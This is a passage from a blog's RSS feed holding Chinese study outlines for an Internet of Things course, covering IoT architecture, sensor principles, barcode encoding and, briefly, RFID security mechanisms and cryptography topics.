	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731_hu8729618424005086314.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028424-115337731_hu12402725759501384594.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151415099&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;413&#34;
		data-flex-basis=&#34;991px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;第四章一个&#34;&gt;第四章一个
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598.png&#34;
	width=&#34;823&#34;
	height=&#34;618&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598_hu18143162716432056277.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028670-1408186598_hu14102212214355167652.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151429227&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;133&#34;
		data-flex-basis=&#34;319px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082.png&#34;
	width=&#34;913&#34;
	height=&#34;229&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082_hu8362456509331561886.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152028924-216733082_hu15240492428445363229.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151435310&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;398&#34;
		data-flex-basis=&#34;956px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;浓缩版&#34;&gt;浓缩版（）
&lt;/h1&gt;&lt;p&gt;第一章&lt;/p&gt;
&lt;p&gt;1.物联网的体系架构和各层的功能及关键技术。&lt;/p&gt;
&lt;p&gt;物联网的4层体系结构：感知控制层、数据传输层、数据组织与管理层、应用决策层&lt;/p&gt;
&lt;p&gt;感知控制层（感知层）：它是物联网发展和应用的基础，由RFID读写器、智能传感节点和接入网关等组成。各种传感节点通过感知目标环境的相关信息，并自行组网传递到网关接入点，网关将收集到的数据通过互联网络提交到后台计算系统处理。后台计算系统处理的结果可以反馈到本层，作为实施动态控制的依据。&lt;/p&gt;
&lt;p&gt;数据传输层：主要负责通过各种接入设备实现互联网、短距离无线网络和移动通信网等不同类型的网络融合，实现物联网感知与控制数据的高效、安全、和可靠传输。还提供路由、格式转换、地址转换等功能。&lt;/p&gt;
&lt;p&gt;数据组织与管理层：提供物联网资源的初始化，监测资源的在线运行状况，协调多个物联网资源（计算资源、通信设备和感知设备等）之间的工作，实现跨域资源间的交互、共享与调度，实现感知数据的语义理解、推理、决策以及提供数据的查询、存储、分析、挖掘等。并利用云计算平台为感知数据的存储、分析提供支持。云计算平台是信息处理的重要部分，也是应用层各种应用的基础。&lt;/p&gt;
&lt;p&gt;应用决策层：物联网应用决策层利用经过分析处理的感知数据，为用户提供多种不同类型的服务，如检索、计算和推理等。物联网应用可分为监控型、控制型、扫描型等。&lt;/p&gt;
&lt;p&gt;物联网的3层体系结构：感知控制层、数据传输层、数据处理层。&lt;/p&gt;
&lt;p&gt;感知控制层：感知控制层作为物联网的核心层，主要用于物品标识和信息的智能采集，它由基本的感应器件以及感应器组成的网络两大部分组成。&lt;/p&gt;
&lt;p&gt;数据传输层：主要完成接入和传输功能，是进行信息交换、传递的数据通路，包括接入网与传输网。&lt;/p&gt;
&lt;p&gt;数据处理层：数据处理层由业务支撑平台、网络管理平台、信息处理平台、服务支撑平台等组成，完成协同、管理、计算、存储、分析、挖掘以及提供面向行业和大众用户的服务等功能。&lt;/p&gt;
&lt;p&gt;关键技术：&lt;/p&gt;
&lt;p&gt;感知层：传感器技术、条形码技术、RFID技术、EPC技术、移动定位技术&lt;/p&gt;
&lt;p&gt;第二章&lt;/p&gt;
&lt;p&gt;1.传感器的组成和各模块的功能。&lt;/p&gt;
&lt;p&gt;2.传感器的特性(静态和动态特性指标和物理意义)。&lt;/p&gt;
&lt;p&gt;3.电阻应变式、电感式和电容式传感器的工作原理(基本的公式推导)。&lt;/p&gt;
&lt;p&gt;第三章&lt;/p&gt;
&lt;p&gt;1.二五条码、交叉二五条码的编码规则。&lt;/p&gt;
&lt;p&gt;2.快速反应(QR)码的码结构和各部分的意义。&lt;/p&gt;
&lt;p&gt;3.射频识别(RFID)系统的组成和工作原理。&lt;/p&gt;
&lt;p&gt;4.两类定位技术(基于测距和非测距)的工作原理。&lt;/p&gt;
&lt;p&gt;第四章(结合PPT资料)&lt;/p&gt;
&lt;p&gt;1.物联网通信系统模型和各模块的功能。&lt;/p&gt;
&lt;p&gt;2.采样定理及物理意义。p143&lt;/p&gt;
&lt;p&gt;3.非均匀量化相比于均匀量化的优势及实现原理。p145&lt;/p&gt;
&lt;p&gt;4.无线传感器网络中MAC层的TRAMA协议和网络层的常见路由协议。p206 p208&lt;/p&gt;
&lt;p&gt;第五章&lt;/p&gt;
&lt;p&gt;1.分类的概念和常见的分类算法(基于人工神经网络)。p270&lt;/p&gt;
&lt;p&gt;2.聚类分析的概念和常见的聚类算法。p278&lt;/p&gt;
&lt;p&gt;第六章&lt;/p&gt;
&lt;p&gt;1.感知层安全中常见的物理安全机制和逻辑安全机制。p299&lt;/p&gt;
&lt;p&gt;物理安全机制：&lt;/p&gt;
&lt;p&gt;kill命令机制、电磁屏蔽、主动干扰、阻塞标签、可分离的标签&lt;/p&gt;
&lt;p&gt;kill命令机制：&lt;/p&gt;
&lt;p&gt;逻辑安全机制：&lt;/p&gt;
&lt;p&gt;散列锁定、临时ID、同步方法与协议、重加密、其他方法（基于PFU的方法、基于掩码的方法）&lt;/p&gt;
&lt;p&gt;2.现代密码学中DES算法(私钥密码体制)和RSA算法(公钥密码体制)的基本原理。p317&lt;/p&gt;
&lt;p&gt;3.访问控制的基本概念和基本原则。p327&lt;/p&gt;
&lt;p&gt;4.数字签名的基本概念和实现过程。p330&lt;/p&gt;
</description>
        </item>
        <item>
        <title>《物联网技术原理》复习提纲</title>
        <link>https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</link>
        <pubDate>Fri, 17 Jun 2022 02:30:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/</guid>
        <description>&lt;h1 id=&#34;物联网复习提纲&#34;&gt;物联网复习提纲
&lt;/h1&gt;&lt;blockquote&gt;
&lt;h1 id=&#34;他郑重地说了看看课后题&#34;&gt;他郑重地说了：“看看课后题。”
&lt;/h1&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 原文档非markdown格式，本文排版问题暂未修复。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 本课程复习提纲由我和@cheerg一起完成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 复习资料为《物联网技术原理》&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第一章p22&#34;&gt;第一章p22
&lt;/h1&gt;&lt;h2 id=&#34;物联网的体系架构各层的功能及关键技术&#34;&gt;物联网的体系架构、各层的功能及关键技术
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;物联网三层体系结构&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;感知控制层：承担物体的标识、信息的采集和远程的控制。&lt;/li&gt;
&lt;li&gt;数据传输层：承担各类设备的网络接入以及信息的传输。&lt;/li&gt;
&lt;li&gt;数据处理层：完成信息的分析处理和决策。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;各层的功能及关键技术&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;感知控制层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;物联网的核心层，主要用于物品标识和信息的智能采集。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由【基本的感应器件】和【感应器组成的网络】两大部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653.png&#34;
	width=&#34;485&#34;
	height=&#34;383&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653_hu10263591739782148005.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152015947-169413653_hu5699055121971467158.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150903301&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;传感器技术&lt;/strong&gt;：把物理量转化为计算机能识别和处理的数字量的一种技术&lt;strong&gt;条形码技术****RFID技术&lt;/strong&gt;：射频识别，通过无线电信号识别特定目标并读写相关数据&lt;strong&gt;EPC技术&lt;/strong&gt;：电子产品代码，为每个产品提供唯一的电子标识符&lt;strong&gt;移动定位技术&lt;/strong&gt;：通过与多个已知坐标位置的固定基站交互，获得启动目标在空间中的技术&lt;strong&gt;无线传感器网络&lt;/strong&gt;：分布式传感网络&lt;strong&gt;物联网控制技术&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;数据传输层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;主要完成接入和传输功能，是进行信息交换、传递的数据通路。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;由【接入网】和【传输网】两部分组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;传输网由公网与专网组成，样例：电信网、广电网、互联网&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;接入网包括：光纤接入、无线接入、以太网接入，卫星接入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关键技术&lt;/strong&gt;：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677.png&#34;
	width=&#34;351&#34;
	height=&#34;386&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677_hu7468320594995887088.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016335-289353677_hu14230738314758837320.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150909863&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;90&#34;
		data-flex-basis=&#34;218px&#34;
	
&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;短距离无线通信技术长距离无线通信技术有线通信技术&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;数据处理层：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;由【业务支撑平台】、【网络管理平台】、【信息处理平台】、【服务支撑平台】等组成。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;关键技术：&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457.png&#34;
	width=&#34;331&#34;
	height=&#34;374&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457_hu8795604759089523796.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016578-1012915457_hu4894776304153626018.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150914519&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;88&#34;
		data-flex-basis=&#34;212px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;第二章&#34;&gt;第二章
&lt;/h1&gt;&lt;h2 id=&#34;传感器的组成和各模块的功能&#34;&gt;传感器的组成和各模块的功能
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;传感器的概念：能感受规定的被测量的信息，并按照一定规律转换成可用信号的器件或装置，通常由敏感元件、转换元件和转换电路等组成。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;敏感元件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：能直接感受或响应被测量，并输出与被测量物体成确定关系的某一物理量的元件。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转换元件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：以敏感元件的输出作为输入，将敏感元件感受或响应的被测量转换成适于传输或测量的电信号。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;转换电路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;概念：将转换元件输出的电路参数转换为一定范围内的电量输出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;传感器的特性性能指标和物理意义&#34;&gt;传感器的特性（性能指标和物理意义）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**[P34]**静态特性：被测量的值处于稳定状态时的输入/输出关系。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;静态特性的重要指标：
&lt;ul&gt;
&lt;li&gt;线性度、灵敏度、迟滞性、重复性、量程、其他特性（分辨率、阈值、稳定性、漂移）（有印象就行，概念不用背）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;**[P38]**动态特性：其输出对随时间变化的输入量的响应特性。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;动态响应特性分为：稳态响应特性和瞬态响应特性&lt;/li&gt;
&lt;li&gt;动态特性往往从时域和频域两方面分析：
&lt;ul&gt;
&lt;li&gt;时域响应和时域性能指标&lt;/li&gt;
&lt;li&gt;频域响应和频域性能指标&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;电阻应变式电感式和电容式传感器的工作原理基本的公式推导&#34;&gt;电阻应变式、电感式和电容式传感器的工作原理（基本的公式推导）
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;电阻应变效应原理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理：将电阻应变片粘贴到各种弹性敏感元件上，通过电阻应变片将应变转换为电阻变化。&lt;/li&gt;
&lt;li&gt;公式推导：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051.png&#34;
	width=&#34;846&#34;
	height=&#34;909&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051_hu2138391237415124933.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152016881-103667051_hu17271113943424629792.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150936690&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;93&#34;
		data-flex-basis=&#34;223px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;电感式传感器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理：利用线圈自感或互感系数的变化来实现非电量电测的一种装置。&lt;/li&gt;
&lt;li&gt;公式推导：&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208.png&#34;
	width=&#34;881&#34;
	height=&#34;903&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208_hu10422754981296869469.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017270-286576208_hu3254327144415742829.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619150952453&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;97&#34;
		data-flex-basis=&#34;234px&#34;
	
&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;电容式传感器&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;原理：以各种类型的电容器作为敏感元件，将被测物理量的变化转化为电容量的变化，再由转换电路转换为电压、电流或频率。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变极距型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808.png&#34;
	width=&#34;883&#34;
	height=&#34;649&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808_hu8682324158003243860.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017548-1149608808_hu14400985546357328642.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151019109&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;136&#34;
		data-flex-basis=&#34;326px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变面积型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437.png&#34;
	width=&#34;883&#34;
	height=&#34;758&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437_hu7871553331500396787.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152017805-1272553437_hu14043981159081773308.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151004290&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;变介质型：&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517.png&#34;
	width=&#34;883&#34;
	height=&#34;393&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517_hu9505633593451082058.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018089-654175517_hu14129969533238113100.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151010474&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;224&#34;
		data-flex-basis=&#34;539px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第三章&#34;&gt;第三章
&lt;/h1&gt;&lt;h2 id=&#34;1p75一维条形码的组成模块单元符号和扫码原理&#34;&gt;1.[P75]一维条形码的组成(模块、单元、符号)和扫码原理。
&lt;/h2&gt;&lt;p&gt;一维条形码是集条形码理论、光电技术、计算机技术、通信技术、条形码印制技术于一体的一种自动识别技术。&lt;/p&gt;
&lt;p&gt;构成条形码的基本单位是模块，模块是指条码中最窄的条或空，模块的宽度通常以mm或mil (1/1000in) 为单位。构成条码的一个条或空称为一个单元，一个单元包含的模块数是由编码方式决定的。&lt;/p&gt;
&lt;p&gt;扫码原理：条形码的扫描需要用到扫描器，扫描器利用自身光源照射条形码，再利用光电转换器接受反射的光线，将反射光线的明暗转换成数字信号。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673.png&#34;
	width=&#34;913&#34;
	height=&#34;301&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673_hu11522051266140797148.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018355-490260673_hu7541844624652630169.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151024667&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;303&#34;
		data-flex-basis=&#34;727px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;2p78二五条码交叉二五条码和三九条码的编码规则&#34;&gt;2.[P78]二五条码、交叉二五条码和三九条码的编码规则。
&lt;/h2&gt;&lt;p&gt;二五条码（最简单的条码）：是一种只有条表示信息的非连续型条码，每个字符由五个条组成，其中两个宽条，三个窄条，字符间隔是窄空，字符集为数字0~9。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346.png&#34;
	width=&#34;913&#34;
	height=&#34;174&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346_hu16913521242681158796.png 480w, https://dorinxl.github.io/p/%E7%89%A9%E8%81%94%E7%BD%91%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86%E5%A4%8D%E4%B9%A0%E6%8F%90%E7%BA%B2/1858293-20220619152018592-391305346_hu15080272457069440723.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20220619151028313&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;524&#34;
		data-flex-basis=&#34;1259px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;交叉二五条码：在二五条码的基础上，扩展到空也表示信息。&lt;/p&gt;
